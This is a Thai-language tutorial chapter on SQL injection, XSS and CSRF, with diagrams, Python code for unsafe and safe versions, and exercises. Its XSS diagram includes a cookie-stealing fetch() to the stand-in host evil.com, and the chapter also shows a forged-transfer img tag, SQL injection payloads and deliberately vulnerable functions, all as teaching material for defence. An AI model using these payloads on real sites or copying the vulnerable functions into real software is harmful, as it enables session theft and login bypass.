# บทที่ 54: SQL Injection, XSS, CSRF

## แนวคิดหลัก (Concept)

สองบทที่ผ่านมาสอนหลักการพื้นฐานของความปลอดภัย (AuthN/AuthZ, Encryption/Hashing) บทนี้เป็นบทปิดท้าย **Part 15: Security** ด้วยช่องโหว่ (vulnerability) ที่พบบ่อยที่สุด 3 แบบในเว็บแอปพลิเคชันจริง ซึ่งล้วนมีรากฐานเดียวกัน: **การไว้ใจ input จากผู้ใช้มากเกินไปโดยไม่ตรวจสอบหรือทำความสะอาดก่อนนำไปใช้งาน**

- **SQL Injection** — การโจมตีที่ผู้ไม่หวังดีแทรก**คำสั่ง SQL ปลอม**เข้าไปใน input ของฟอร์ม ทำให้คำสั่ง SQL ที่ระบบสร้างขึ้นมีความหมายเปลี่ยนไปจากที่ตั้งใจ (เชื่อมโยงกับ SQL จากบทที่ 39-41)
- **XSS (Cross-Site Scripting)** — การโจมตีที่ผู้ไม่หวังดีแทรก**โค้ด JavaScript ปลอม**เข้าไปในหน้าเว็บ ทำให้โค้ดนั้นทำงานในเบราว์เซอร์ของผู้ใช้คนอื่นที่มาดูหน้านั้น (เช่น ขโมย token/cookie)
- **CSRF (Cross-Site Request Forgery)** — การโจมตีที่หลอกให้เบราว์เซอร์ของผู้ใช้ที่**ล็อกอินอยู่แล้ว**ส่ง request ไปทำสิ่งที่ผู้ใช้ไม่ได้ตั้งใจ (เช่น โอนเงิน) โดยอาศัยว่าเบราว์เซอร์แนบ session/cookie ไปด้วยอัตโนมัติทุกครั้ง
- **Input Validation / Sanitization** — หลักการป้องกันร่วมของทั้งสามช่องโหว่: ตรวจสอบและทำความสะอาด input จากผู้ใช้ก่อนนำไปใช้งานเสมอ ไม่ว่าจะใช้ในคำสั่ง SQL, แสดงผลบนหน้าเว็บ, หรือประมวลผล request ใดๆ

## ทำไมต้องมีสิ่งนี้ (Why it exists)

- **SQL Injection มีไว้อธิบายว่าทำไมการต่อ string สร้างคำสั่ง SQL โดยตรงถึงอันตราย**: ถ้าระบบสร้างคำสั่ง SQL ด้วยการต่อ string ตรงๆ จาก input ผู้ใช้ (เช่น `f"SELECT * FROM users WHERE name = '{user_input}'"`) ผู้ใช้ที่ป้อน input พิเศษสามารถเปลี่ยนความหมายของคำสั่งทั้งหมดได้ เช่น ทำให้เงื่อนไข `WHERE` เป็นจริงเสมอ (ข้าม authentication ได้) หรือแม้แต่ลบตารางทั้งหมด — ปัญหานี้ป้องกันได้ง่ายมากด้วย Parameterized Query แต่ยังพบบ่อยมากในโค้ดจริง
- **XSS มีไว้เตือนว่าการแสดงผล input ของผู้ใช้กลับไปที่หน้าเว็บโดยไม่กรองก่อนอันตรายแค่ไหน**: เว็บแอปที่รับ input จากผู้ใช้แล้วแสดงกลับ (เช่น ระบบ comment, ช่องค้นหาที่แสดง "คุณค้นหา X") ถ้าไม่กรอง HTML/JavaScript ออกก่อนแสดงผล ผู้โจมตีสามารถฝังสคริปต์ที่ทำงานในเบราว์เซอร์ของทุกคนที่มาดูหน้านั้น (เช่น ขโมย session cookie ไปสวมรอยเป็นผู้ใช้คนอื่น)
- **CSRF มีไว้เตือนว่า Authentication อย่างเดียว (บทที่ 52) ไม่พอสำหรับความปลอดภัย**: แม้ผู้ใช้จะยืนยันตัวตนถูกต้อง (มี session/cookie ที่ valid) เบราว์เซอร์ยังคงแนบ cookie นั้นไปกับ**ทุก request**ที่ส่งไปยังเว็บไซต์นั้นโดยอัตโนมัติ ไม่ว่า request จะมาจากหน้าเว็บที่ผู้ใช้ตั้งใจเข้าหรือหน้าเว็บอันตรายที่หลอกให้ส่ง request แอบแฝง — ต้องมีกลไกเพิ่มเติมยืนยันว่า request นั้นมาจากความตั้งใจของผู้ใช้จริงๆ

## เปรียบเทียบกับชีวิตจริง (Real-world analogy)

- **SQL Injection** เหมือน **การกรอกแบบฟอร์มที่ช่อง "ชื่อ" แล้วเขียนคำสั่งพิเศษที่ทำให้เจ้าหน้าที่อ่านแล้วตีความผิดไปจากที่ตั้งใจ** เช่น กรอกชื่อว่า "สมชาย (ให้ลบประวัติทั้งหมดของทุกคนด้วย)" — ถ้าเจ้าหน้าที่ (ระบบ) ทำตามข้อความในแบบฟอร์มโดยไม่แยกแยะว่าอะไรคือ "ชื่อ" กับอะไรคือ "คำสั่ง" จะเกิดปัญหาใหญ่
- **XSS** เหมือน **การเขียนข้อความในสมุดเยี่ยมชมของโรงแรมที่มีกับดักซ่อนอยู่** (เช่น สติกเกอร์ที่ถ้าใครแกะดูจะโดนกับดัก) — แขกคนต่อไปที่มาอ่านสมุดเยี่ยม (ผู้ใช้ที่มาดูหน้าเว็บ) จะโดนกับดักนั้นโดยไม่รู้ตัว ทั้งที่ไม่ได้ทำอะไรผิดเลย
- **CSRF** เหมือน **การหลอกให้เซ็นเอกสารในขณะที่ยังไม่ได้ถอดบัตรประจำตัวพนักงานออก** — เจ้าหน้าที่เห็นบัตรพนักงานที่ห้อยอยู่ (cookie ที่แนบมาอัตโนมัติ) แล้วเชื่อว่าเป็นคำสั่งที่พนักงานคนนั้นตั้งใจทำจริง ทั้งที่จริงๆ ถูกหลอกให้เซ็นโดยไม่รู้ตัว

## แผนภาพอธิบาย (Visual explanation)

### SQL Injection — การต่อ String สร้างคำสั่ง SQL ที่อันตราย

```
โค้ดที่อันตราย:
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"

ถ้าผู้ใช้กรอก username = admin' --  (เว้นวรรค password ว่าง)

คำสั่งที่แท้จริงกลายเป็น:
SELECT * FROM users WHERE username = 'admin' --' AND password = ''
                                     └─────┬─────┘
                              -- คือ comment ใน SQL ทำให้ส่วนหลังถูกตัดทิ้งไปเลย!

ผลลัพธ์: ผ่านการตรวจสอบโดยไม่ต้องรู้รหัสผ่านจริงเลย! (bypass authentication ทั้งหมด)
```

### XSS — สคริปต์ที่ผู้โจมตีฝังไว้ทำงานในเบราว์เซอร์ของเหยื่อ

```
ผู้โจมตีโพสต์ comment:
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>

ถ้าเว็บไซต์แสดง comment กลับไปโดยไม่กรอง HTML:

หน้าเว็บที่ผู้ใช้อื่นเห็น:
  ...
  Comment: <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
  ...

เบราว์เซอร์ของทุกคนที่มาดูหน้านี้ "รัน" สคริปต์นี้ทันที (ไม่ใช่แค่แสดงข้อความ)
-> ส่ง cookie ของแต่ละคนไปให้ผู้โจมตี -> เอา cookie ไปสวมรอยเป็นผู้ใช้คนนั้นได้ทันที
```

### CSRF — หลอกให้เบราว์เซอร์ส่ง Request แอบแฝง

```
1. ผู้ใช้ล็อกอิน bank.com สำเร็จ (browser เก็บ session cookie ไว้)

2. ผู้ใช้เปิดเว็บอันตราย evil.com ในแท็บอื่น (โดยไม่รู้ว่ามีกับดัก)
   evil.com มี HTML ซ่อนอยู่:
   <img src="https://bank.com/transfer?to=attacker&amount=10000">

3. เบราว์เซอร์โหลดรูปภาพนี้อัตโนมัติ -> ส่ง GET request ไปที่ bank.com
   -> แนบ session cookie ของ bank.com ไปด้วยอัตโนมัติ (เบราว์เซอร์ทำเองโดยไม่ถาม)

4. bank.com เห็น request ที่มี cookie ถูกต้อง -> เชื่อว่าเป็นคำสั่งจากผู้ใช้จริง -> โอนเงินสำเร็จ!
   (ทั้งที่ผู้ใช้ไม่เคยตั้งใจกดอะไรเลย)
```

## ตัวอย่างโค้ด (Code example)

```python
import sqlite3
import html
import secrets

# ===== SQL Injection: โค้ดอันตราย vs โค้ดปลอดภัย =====
def login_unsafe(username, password, conn):
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    return conn.execute(query).fetchone()                    # อันตราย! ต่อ string ตรงๆ

def login_safe(username, password, conn):
    query = "SELECT * FROM users WHERE username = ? AND password = ?"
    return conn.execute(query, (username, password)).fetchone()   # ปลอดภัย: Parameterized Query
    # ฐานข้อมูลจัดการ username/password เป็น "ข้อมูล" เสมอ ไม่มีทางตีความเป็น "คำสั่ง SQL" ได้

# ทดสอบ: username = "admin' --" กับ password = "anything"
# login_unsafe: อาจ bypass ได้ (ขึ้นกับฐานข้อมูล)
# login_safe: ค้นหา username ที่ชื่อ "admin' --" ตรงตัวอักษร (ไม่พบ) -> ปลอดภัย

# ===== XSS: escape HTML ก่อนแสดงผลเสมอ =====
def render_comment_unsafe(comment):
    return f"<div class='comment'>{comment}</div>"             # อันตราย! ไม่กรอง HTML/JavaScript เลย

def render_comment_safe(comment):
    escaped = html.escape(comment)                                # แปลง < > & " ' ให้เป็น HTML entity
    return f"<div class='comment'>{escaped}</div>"

malicious_input = "<script>alert('XSS')</script>"
print(render_comment_unsafe(malicious_input))
# <div class='comment'><script>alert('XSS')</script></div>  -- สคริปต์นี้จะรันจริงในเบราว์เซอร์!

print(render_comment_safe(malicious_input))
# <div class='comment'>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</div>  -- แสดงเป็นข้อความเฉยๆ ไม่รัน

# ===== CSRF: ใช้ CSRF Token ยืนยันว่า request มาจากความตั้งใจจริง =====
def generate_csrf_token(session):
    token = secrets.token_hex(32)                                # สุ่ม token ที่คาดเดาไม่ได้
    session["csrf_token"] = token                                   # เก็บไว้ในฝั่ง server (ผูกกับ session ผู้ใช้)
    return token                                                     # ฝัง token นี้ใน form ที่ render กลับไปให้ผู้ใช้

def verify_csrf_token(session, submitted_token):
    expected_token = session.get("csrf_token")
    return expected_token is not None and secrets.compare_digest(expected_token, submitted_token)
    # ใช้ compare_digest แทน == ธรรมดา เพื่อป้องกัน timing attack (เปรียบเทียบเวลาคงที่เสมอ)

def transfer_money(request_data, session):
    if not verify_csrf_token(session, request_data.get("csrf_token", "")):
        return {"error": "Invalid CSRF token", "status": 403}          # ปฏิเสธทันทีถ้าไม่มี token ที่ถูกต้อง
    # ... ดำเนินการโอนเงินจริง ...
    return {"success": True}
```

## ทำงานทีละขั้นตอน (Step-by-step execution)

1. `login_safe` ใช้ **Parameterized Query** (`?` เป็น placeholder แทนการต่อ string) — ฐานข้อมูล**แยกแยะระหว่าง "คำสั่ง SQL" กับ "ข้อมูล" อย่างเด็ดขาด** ตั้งแต่ระดับ driver ก่อนจะรันคำสั่งจริง ไม่ว่าผู้ใช้จะป้อน `username` เป็นอะไรก็ตาม (แม้จะมีเครื่องหมาย `'` หรือ `--` ปนอยู่) มันจะถูกปฏิบัติเป็น**ค่าข้อมูลเสมอ ไม่มีทางถูกตีความเป็นส่วนหนึ่งของคำสั่ง SQL ได้** ต่างจาก `login_unsafe` ที่ต่อ string ตรงๆ ทำให้เครื่องหมายพิเศษเหล่านี้เปลี่ยนความหมายของคำสั่งทั้งหมดได้
2. `html.escape(comment)` ใน `render_comment_safe` — แปลงอักขระพิเศษของ HTML (`<`, `>`, `&`, `"`, `'`) ให้เป็น **HTML entity** (เช่น `<` กลายเป็น `&lt;`) ทำให้เบราว์เซอร์**แสดงอักขระเหล่านี้เป็นข้อความธรรมดา แทนที่จะตีความเป็น HTML tag หรือเริ่มต้น script block** — `<script>` ที่ผ่านการ escape แล้วจะกลายเป็น `&lt;script&gt;` ซึ่งเบราว์เซอร์แสดงเป็นตัวหนังสือ `<script>` เฉยๆ ไม่รันเป็นโค้ดจริง
3. `generate_csrf_token(session)` — สุ่มค่าที่**คาดเดาไม่ได้**ด้วย `secrets.token_hex(32)` (โมดูล `secrets` ออกแบบมาสำหรับความปลอดภัยโดยเฉพาะ ต่างจาก `random` ธรรมดาที่ใช้ predictable algorithm) แล้วเก็บไว้ทั้งฝั่ง server (`session["csrf_token"]`) และฝัง**ไว้ในฟอร์ม HTML** ที่ส่งกลับไปให้ผู้ใช้ (มักเป็น hidden input field) — เว็บไซต์อันตราย (`evil.com`) ไม่มีทางรู้ค่า token นี้ได้เลย เพราะไม่เคยได้รับฟอร์มที่ฝัง token ไว้จาก server จริง
4. `verify_csrf_token(session, submitted_token)` — เปรียบเทียบ token ที่ส่งมากับ request กับ token ที่เก็บไว้ใน session ด้วย `secrets.compare_digest` (แทนที่จะใช้ `==` ธรรมดา) เพื่อป้องกัน **Timing Attack** (การเปรียบเทียบแบบธรรมดาอาจใช้เวลาต่างกันเล็กน้อยขึ้นกับว่าตัวอักษรตรงกันกี่ตัวก่อนเจอความต่าง ทำให้ผู้โจมตีเดา token ทีละตัวอักษรได้จากเวลาที่ตอบกลับ) — ถ้า `transfer_money` ถูกเรียกจาก `evil.com` (ตามสถานการณ์ CSRF ในแผนภาพ) request นั้นจะ**ไม่มี** `csrf_token` ที่ถูกต้องแนบมาด้วย ทำให้ถูกปฏิเสธทันทีแม้ session cookie จะถูกต้องก็ตาม

## Time Complexity

ทั้งสามช่องโหว่เป็นประเด็นด้าน**ความปลอดภัย** ไม่ใช่อัลกอริทึม แต่การป้องกันมีต้นทุนที่วัดได้:
- Parameterized Query: **O(1)** overhead เพิ่มเติมเทียบกับการต่อ string ตรงๆ (แทบไม่มีผลต่อความเร็ว)
- `html.escape()`: **O(n)** โดย n คือความยาวของข้อความที่ต้อง escape
- CSRF Token generation/verification: **O(1)** สำหรับการสุ่มและเปรียบเทียบ token

การป้องกันทั้งสามแบบมีต้นทุนด้านประสิทธิภาพที่**น้อยมากจนไม่มีนัยสำคัญ** เทียบกับความเสียหายมหาศาลที่อาจเกิดขึ้นถ้าไม่ป้องกันเลย

## Space Complexity

- CSRF Token ใช้พื้นที่เพิ่มเติมเล็กน้อย **O(1)** ต่อ session สำหรับเก็บ token ปัจจุบัน

## แนวทางปฏิบัติที่ดี (Best Practices)

- ใช้ **Parameterized Query / Prepared Statement เสมอ** ไม่มีข้อยกเว้น — ห้ามต่อ string สร้างคำสั่ง SQL จาก input ผู้ใช้โดยตรงแม้แต่ครั้งเดียว ไม่ว่าจะดูเหมือน "ปลอดภัยพอ" แค่ไหนก็ตาม
- **Escape ทุก input ของผู้ใช้ก่อนแสดงผลบนหน้าเว็บเสมอ** ใช้ template engine ที่ escape ให้อัตโนมัติ (เช่น Jinja2, React) แทนการต่อ HTML string เองตรงๆ
- ใช้ CSRF Token สำหรับทุก request ที่**เปลี่ยนแปลงข้อมูล** (POST, PUT, DELETE) และตั้งค่า cookie เป็น `SameSite=Strict` หรือ `SameSite=Lax` เพื่อเพิ่มการป้องกันอีกชั้น (เบราว์เซอร์จะไม่แนบ cookie ไปกับ request ข้ามเว็บไซต์โดยอัตโนมัติ)
- ยึดหลัก **"ไม่ไว้ใจ input จากผู้ใช้เด็ดขาด" (Never trust user input)** เป็นหลักการพื้นฐานที่สุดของความปลอดภัย ครอบคลุมทั้งสามช่องโหว่ในบทนี้และอื่นๆ อีกมาก

## ข้อผิดพลาดที่พบบ่อย (Common Mistakes)

- ต่อ string สร้างคำสั่ง SQL โดยคิดว่า "แค่ตรวจสอบ input เบื้องต้นก็พอ" (เช่น กรองแค่บางอักขระ) แทนที่จะใช้ Parameterized Query ที่ป้องกันได้เด็ดขาดกว่ามาก
- แสดง input ผู้ใช้กลับไปที่หน้าเว็บโดยคิดว่า "ผู้ใช้ทั่วไปไม่มีทางพิมพ์ script" โดยลืมว่าผู้โจมตีตั้งใจพิมพ์สิ่งที่อันตรายเข้ามาโดยเฉพาะ
- ป้องกัน CSRF ด้วยการเช็คแค่ session cookie อย่างเดียว โดยไม่มี CSRF token แยกต่างหาก ทั้งที่ cookie ถูกแนบไปอัตโนมัติได้จากทุกที่ (นี่คือรากของปัญหา CSRF)
- คิดว่า HTTPS (บทที่ 42) ป้องกัน SQL Injection/XSS/CSRF ได้ — HTTPS ป้องกันแค่การดักฟังข้อมูลระหว่างทาง ไม่เกี่ยวข้องกับช่องโหว่ทั้งสามแบบนี้เลย ต้องป้องกันแยกกันตามหลักการเฉพาะของแต่ละแบบ

## คำถามสัมภาษณ์งาน (Interview Questions)

1. อธิบาย SQL Injection คืออะไร ทำไม Parameterized Query ถึงป้องกันได้เด็ดขาดกว่าการกรอง input ด้วยมือ
2. XSS คืออะไร มีกี่ประเภท (Stored, Reflected, DOM-based) และป้องกันได้อย่างไร
3. CSRF ต่างจาก XSS อย่างไร ทำไม CSRF Token ถึงป้องกัน CSRF ได้
4. ทำไม `SameSite` cookie attribute ถึงช่วยลดความเสี่ยงของ CSRF
5. อธิบายหลักการ "Never trust user input" และยกตัวอย่างว่าหลักการนี้เกี่ยวข้องกับทั้งสามช่องโหว่ในบทนี้อย่างไร

## แบบฝึกหัด (Practice Exercises)

1. เขียนฟังก์ชัน login ทั้งแบบที่มีช่องโหว่ SQL Injection และแบบที่ปลอดภัย แล้วทดสอบด้วย input `"admin' --"` เพื่อพิสูจน์ความแตกต่าง
2. เขียนระบบ comment ง่ายๆ ที่มีช่องโหว่ XSS แล้วแก้ไขด้วย `html.escape()` พิสูจน์ว่า script ที่ฝังไว้ไม่ทำงานอีกต่อไปหลังแก้ไข
3. Implement ระบบ CSRF Token แบบง่ายสำหรับฟอร์มโอนเงินจำลอง แล้วทดสอบว่า request ที่ไม่มี token ที่ถูกต้องถูกปฏิเสธ

## Mini Project

**"เครื่องมือตรวจสอบช่องโหว่พื้นฐาน (Basic Vulnerability Scanner & Secure Web Form Demo)"**: เขียนโปรแกรมที่:
1. สร้างเว็บฟอร์มจำลอง (login, comment, transfer) ทั้งเวอร์ชันที่มีช่องโหว่และเวอร์ชันที่ปลอดภัย
2. เขียนสคริปต์ทดสอบอัตโนมัติที่ลองยิง payload ทั่วไปของ SQL Injection (`' OR '1'='1`), XSS (`<script>...</script>`), และ CSRF (request ที่ไม่มี token) ใส่ทั้งสองเวอร์ชัน แล้วรายงานว่าเวอร์ชันไหนป้องกันได้/ไม่ได้
3. เขียนรายงานสรุปสำหรับแต่ละช่องโหว่: คืออะไร, payload ตัวอย่างที่ใช้โจมตี, วิธีป้องกันที่ถูกต้อง, และผลการทดสอบจริงที่ได้
4. รวมทุกอย่างที่เรียนใน Part 15 (Authentication, Hashing, และการป้องกันช่องโหว่ในบทนี้) เข้าเป็นระบบ Mini Web App ตัวอย่างที่ปลอดภัยครบวงจร

## ข้อคิดสำคัญ (Key Takeaways)

- SQL Injection เกิดจากการต่อ string สร้างคำสั่ง SQL จาก input ผู้ใช้โดยตรง ป้องกันได้เด็ดขาดด้วย Parameterized Query
- XSS เกิดจากการแสดงผล input ผู้ใช้กลับไปที่หน้าเว็บโดยไม่ escape HTML/JavaScript ก่อน ป้องกันได้ด้วยการ escape เสมอ
- CSRF เกิดจากการที่เบราว์เซอร์แนบ cookie ไปกับทุก request อัตโนมัติ ทำให้เว็บไซต์อันตรายหลอกให้ส่ง request แอบแฝงได้ ป้องกันด้วย CSRF Token และ SameSite cookie
- ทั้งสามช่องโหว่มีรากฐานเดียวกัน: การไว้ใจ input จากผู้ใช้มากเกินไป — หลักการ "Never trust user input" คือกุญแจสำคัญที่ครอบคลุมการป้องกันทั้งหมด
- HTTPS ป้องกันการดักฟังข้อมูล แต่ไม่เกี่ยวข้องกับช่องโหว่ทั้งสามแบบนี้เลย ต้องป้องกันแยกกันตามหลักการเฉพาะของแต่ละแบบ
- นี่คือบทปิดท้าย **Part 15: Security** — ตลอด 3 บทที่ผ่านมา (AuthN/AuthZ, Encryption/Hashing, ช่องโหว่เว็บ) วางรากฐานความปลอดภัยที่จำเป็นสำหรับวิศวกรซอฟต์แวร์ทุกคน บทถัดไปจะเข้าสู่ **Part 16: System Design** ซึ่งนำทุกอย่างที่เรียนมาตลอดหลักสูตร (โครงสร้างข้อมูล, อัลกอริทึม, ฐานข้อมูล, เครือข่าย, ความปลอดภัย) มาประกอบกันออกแบบระบบขนาดใหญ่ โดยเริ่มจาก Scalability, Load Balancing, Caching, Redis, CDN

---
*บทต่อไป (บทที่ 55): Scalability, Load Balancing, Caching, Redis, CDN — พิมพ์ "Next" เพื่อดำเนินการต่อ*
